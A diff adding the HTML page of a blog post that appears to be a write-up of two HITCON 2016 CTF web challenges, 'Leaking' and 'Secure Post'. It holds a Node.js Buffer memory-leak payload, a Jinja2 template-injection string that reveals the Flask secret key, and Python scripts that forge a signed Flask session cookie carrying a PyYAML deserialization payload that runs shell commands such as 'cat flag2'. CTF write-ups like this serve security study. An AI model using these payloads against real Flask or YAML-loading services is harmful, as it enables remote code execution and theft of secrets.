@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>HITCON 2016 web 总结 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="OTP和RSA遇到困难, 先发篇web的出来本次HITCON, 我看了两题web, Leaking和Secure Post, 都挺有意思的">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON 2016 web 总结">
+<meta property="og:url" content="http://0x48.pw/2016/10/14/0x24/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="OTP和RSA遇到困难, 先发篇web的出来本次HITCON, 我看了两题web, Leaking和Secure Post, 都挺有意思的">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/leak1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/leak2.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/secpost.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/secpost2.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/secu1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/secu2.png">
+<meta property="og:updated_time" content="2016-10-15T05:24:51.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON 2016 web 总结">
+<meta name="twitter:description" content="OTP和RSA遇到困难, 先发篇web的出来本次HITCON, 我看了两题web, Leaking和Secure Post, 都挺有意思的">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/leak1.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x24" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/10/14/0x24/" class="article-date">
+      <time datetime="2016-10-14T08:32:06.000Z" itemprop="datePublished">2016-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HITCON 2016 web 总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>OTP和RSA遇到困难, 先发篇web的出来<br>本次HITCON, 我看了两题web, Leaking和Secure Post, 都挺有意思的</p>
+<a id="more"></a>
+<h1 id="Leaking-Web-200"><a href="#Leaking-Web-200" class="headerlink" title="Leaking(Web 200)"></a>Leaking(Web 200)</h1><p><img src="http://qn.lazysheep.cc/img/leak1.png" alt="leak1"></p>
+<blockquote>
+<p>源码: <a href="https://github.com/Hcamael/CTF_repo/blob/master/HITCON/Leaking/index.js" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/blob/master/HITCON/Leaking/index.js</a></p>
+</blockquote>
+<p>代码很简单, 很明显是绕vm2沙箱之类的黑魔法, 比较幸运, 搜到了相关资料: <a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md" target="_blank" rel="external">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>
+<p>然后根据这里面的内容, 很容易就可以构造出payload:</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?data[]=<span class="keyword">for</span> (<span class="built_in">var</span> <span class="keyword">step</span> = <span class="number">0</span>; <span class="keyword">step</span> &lt; <span class="number">100000</span>; <span class="keyword">step</span>++) &#123;<span class="built_in">var</span> buf = (<span class="built_in">new</span> Buffer(<span class="number">100</span>)).toString('<span class="built_in">ascii</span>');<span class="keyword">if</span> (buf.indexOf(<span class="string">"hitcon&#123;"</span>) !== -<span class="number">1</span>) &#123;<span class="built_in">break</span>;&#125;&#125;buf;</div></pre></td></tr></table></figure>
+<p>首先是通过数组bypass长度限制, 然后之后就是使用<code>Buffer</code>获取内存中的数据, 具体细节不是很清楚, 没有深入分析过, 感觉像是nodejs内存分配上的问题</p>
+<p>这个payload不是每次都可以成功泄露出flag, 所以需要运行多次</p>
+<p><img src="http://qn.lazysheep.cc/img/leak2.png" alt="leak2"></p>
+<h1 id="Secure-Post-Web-50-150"><a href="#Secure-Post-Web-50-150" class="headerlink" title="Secure Post(Web 50/150)"></a>Secure Post(Web 50/150)</h1><p><img src="http://qn.lazysheep.cc/img/secpost.png" alt="spost"><br><img src="http://qn.lazysheep.cc/img/secpost2.png" alt="spost2"></p>
+<blockquote>
+<p>源码: <a href="https://github.com/Hcamael/CTF_repo/tree/master/HITCON/Secure%20Posts%20and%202" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITCON/Secure%20Posts%20and%202</a></p>
+</blockquote>
+<p>python flask web代码审计题, 挺有意思的, 有两个flag, 所以分为了两题</p>
+<p>老司机能很熟练的找到问题点:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def render_template(filename, **args):</div><div class="line">    <span class="keyword">with</span> open(safe_join(app.template_folder, filename)) <span class="keyword">as</span> f:</div><div class="line">        template = f.<span class="built_in">read</span>()</div><div class="line">    <span class="built_in">name</span> = session.<span class="keyword">get</span>('<span class="built_in">name</span>', 'anonymous')[:<span class="number">10</span>]</div><div class="line"><span class="built_in">    return</span> render_template_string(template.format(<span class="built_in">name</span>=<span class="built_in">name</span>), **args)</div></pre></td></tr></table></figure></p>
+<p>很明显是模板注入, 关于模板注入推荐一篇文章: <a href="http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates.html" target="_blank" rel="external">http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates.html</a></p>
+<p>但是文章中的payload明显不能用, 因为:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name = request<span class="selector-class">.form</span><span class="selector-class">.get</span>(<span class="string">'author'</span>, <span class="string">'anonymous'</span>)[:<span class="number">10</span>]</div></pre></td></tr></table></figure></p>
+<p>name字段限制了10个byte的长度, 第一题分低, 相对的也比较简单<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app<span class="selector-class">.secret_key</span> = config.flag1</div></pre></td></tr></table></figure></p>
+<p>所以可以读取配置信息:<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;config&#125;&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="http://qn.lazysheep.cc/img/secu1.png" alt="secu1"></p>
+<p><img src="http://qn.lazysheep.cc/img/secu2.png" alt="secu2"></p>
+<p>可以看到<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">'SECRET_KEY</span>': <span class="symbol">'hitcon</span>&#123;&gt;_&lt;<span class="comment">---Do-you-know-&lt;script&gt;alert(1)&lt;/script&gt;-is-very-fun?&#125;'</span></div></pre></td></tr></table></figure></p>
+<p>flag1 get</p>
+<p>第二步根据经验可以判断出应该是执行命令, 读文件之类的.</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_posts</span><span class="params">()</span></span>:</div><div class="line">    handlers = &#123;</div><div class="line">        <span class="comment"># disabled insecure data type</span></div><div class="line">        <span class="comment">#"eval": load_eval,</span></div><div class="line">        <span class="comment">#"pickle": load_pickle,</span></div><div class="line"></div><div class="line">        <span class="string">"json"</span>: load_json,</div><div class="line">        <span class="string">"yaml"</span>: load_yaml</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>源码中这段, 把可以执行命令的危险数据类型给注释了, 不过还是漏了yaml</p>
+<p>参考文档: <a href="http://pyyaml.org/wiki/PyYAMLDocumentation" target="_blank" rel="external">http://pyyaml.org/wiki/PyYAMLDocumentation</a></p>
+<p>yaml load同样可以造成命令执行</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; data = <span class="string">""</span><span class="string">"!!python/object/apply:os.system</span></div><div class="line">... args: [id]"<span class="string">""</span></div><div class="line"></div><div class="line">&gt;&gt;&gt; yaml.load<span class="comment">(data)</span></div><div class="line">uid=<span class="number">1000</span><span class="comment">(hehe)</span> gid=<span class="number">1000</span><span class="comment">(hehe)</span> groups=<span class="number">1000</span><span class="comment">(hehe)</span>,<span class="number">4</span><span class="comment">(adm)</span>,<span class="number">24</span><span class="comment">(cdrom)</span>,<span class="number">27</span><span class="comment">(sudo)</span>,<span class="number">30</span><span class="comment">(dip)</span>,<span class="number">46</span><span class="comment">(plugdev)</span>,<span class="number">113</span><span class="comment">(lpadmin)</span>,<span class="number">128</span><span class="comment">(sambashare)</span>,<span class="number">129</span><span class="comment">(wireshark)</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
+<p>不过在这之前还存在一个问题, 数据在load之前, 都会经过一个dump, 那么如果绕过这个dump呢?</p>
+<p>这就涉及到flask的session机制了, 不像php, seesion是保存在<code>/tmp/sess_$_COOKIE[&#39;PHPSESSID&#39;]</code> 文件中</p>
+<p>flask通过secret_key对seesion进行加密, 然后保存在cookie中, 通过上一步我们获取到的secret_key我们就能构造任意cookie了</p>
+<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> yaml  </div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"></div><div class="line">key = <span class="string">r"hitcon&#123;&gt;_&lt;---Do-you-know-&lt;script&gt;alert(1)&lt;/script&gt;-is-very-fun?&#125;"</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span>  </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.secret_key = <span class="keyword">None</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_yaml</span><span class="params">(data)</span>:</span>  </div><div class="line">    <span class="keyword">import</span> yaml</div><div class="line">    <span class="keyword">return</span> yaml.load(data)</div><div class="line"></div><div class="line">exploit = <span class="string">"""!!python/object/apply:eval</span></div><div class="line">args: ["[&#123;'title': 'b', 'date': 'October 10, 2016 05:36:11', 'author': 'a', 'content': __import__('os').popen('id').readlines()&#125;]"]</div><div class="line">"""</div><div class="line"></div><div class="line">exploit = &#123;<span class="string">'post_type'</span>: <span class="string">u'yaml'</span>,  </div><div class="line">           <span class="string">'post_data'</span>: exploit&#125;</div><div class="line"></div><div class="line">app = App()  </div><div class="line">app.secret_key = key</div><div class="line"></div><div class="line"><span class="comment"># Encode a session exactly how Flask would do it</span></div><div class="line">si = SecureCookieSessionInterface()  </div><div class="line">serializer = si.get_signing_serializer(app)  </div><div class="line">session = serializer.dumps(exploit)</div><div class="line"></div><div class="line">print(<span class="string">"Change your session cookie to: "</span>)  </div><div class="line">print(session)</div></pre></td></tr></table></figure></p>
+<p>以上为构造cookie的代码</p>
+<p>下面加上了攻击代码</p>
+<p>payload2<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> yaml  </div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</div><div class="line"></div><div class="line">key = <span class="string">r"hitcon&#123;&gt;_&lt;---Do-you-know-&lt;script&gt;alert(1)&lt;/script&gt;-is-very-fun?&#125;"</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span>  </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.secret_key = <span class="keyword">None</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_yaml</span><span class="params">(data)</span>:</span>  </div><div class="line">    <span class="keyword">import</span> yaml</div><div class="line">    <span class="keyword">return</span> yaml.load(data)</div><div class="line"></div><div class="line">exploit = <span class="string">"""!!python/object/apply:eval</span></div><div class="line">args: ["[&#123;'title': 'b', 'date': 'October 10, 2016 05:36:11', 'author': 'a', 'content': __import__('os').popen('cat flag2').readlines()&#125;]"]</div><div class="line">"""</div><div class="line"></div><div class="line">exploit = &#123;<span class="string">'post_type'</span>: <span class="string">u'yaml'</span>,  </div><div class="line">           <span class="string">'post_data'</span>: exploit&#125;</div><div class="line"></div><div class="line">app = App()  </div><div class="line">app.secret_key = key</div><div class="line"></div><div class="line"><span class="comment"># Encode a session exactly how Flask would do it</span></div><div class="line">si = SecureCookieSessionInterface()  </div><div class="line">serializer = si.get_signing_serializer(app)  </div><div class="line">session = serializer.dumps(exploit)</div><div class="line"></div><div class="line">print(<span class="string">"Change your session cookie to: "</span>)  </div><div class="line">print(session)</div><div class="line"></div><div class="line">url = <span class="string">"xxxxx"</span></div><div class="line"></div><div class="line">cookie = &#123;<span class="string">"session"</span>: session&#125;</div><div class="line"></div><div class="line">r = requests.get(url, cookies=cookie)</div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">"(hitcon&#123;.*&#125;)"</span>, r.content)</div></pre></td></tr></table></figure></p>
+<p>返回结果:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python payload2<span class="selector-class">.py</span></div><div class="line">Change your session cookie to: </div><div class="line"><span class="selector-class">.eJwlj0FrgzAARv_KyHmHLM5BCz1YQTFOC9ppzGWYxEWdRoeuMZb-99n1-sH7Hu8KxmGaP0U5l2B_BU8M7EGQeroiycDQ64Uh_EPzGL4jT3N_sU99hopchwXBiq-DzA1mlRGwJMlEU_4WuKLBRkuMklr4H-rUOOqMYrj9dLxxlsjVMmqdJW4cHZ-HNW6HJUr5tHG1uDut4J8pHlvLkA1pbkO8ucjLbmTkeOEq-SJGKmZFKkxtzaxjxxqpCuTBwKdTkXODzfcv77Oa-svI-mwN3W5HUixceTiA2_OjejZjtfWasu_A7Q9r1lu4</span><span class="selector-class">.CuNO7A</span><span class="selector-class">.FE48aONgxecQpjbPEBOv5PgQdbo</span></div><div class="line">[<span class="string">'hitcon&#123;unseriliaze_is_dangerous_but_RCE_is_fun!!&#125;'</span>]</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-10-14, 16:32:06</p>
+        <p><span>最后更新:</span>2016-10-15, 13:24:51</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/10/14/0x24/" title="HITCON 2016 web 总结">http://0x48.pw/2016/10/14/0x24/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/10/14/0x24/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/11/03/0x26/">
+                    PWN学习总结之基础栈溢出
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/10/12/0x23/">
+                    2016 HITCON Crypto -- PAKE(++)
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Leaking-Web-200"><span class="toc-number">1.</span> <span class="toc-text">Leaking(Web 200)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secure-Post-Web-50-150"><span class="toc-number">2.</span> <span class="toc-text">Secure Post(Web 50/150)</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/11/03/0x26/" title="上一篇: PWN学习总结之基础栈溢出">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/10/12/0x23/" title="下一篇: 2016 HITCON Crypto -- PAKE(++)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a 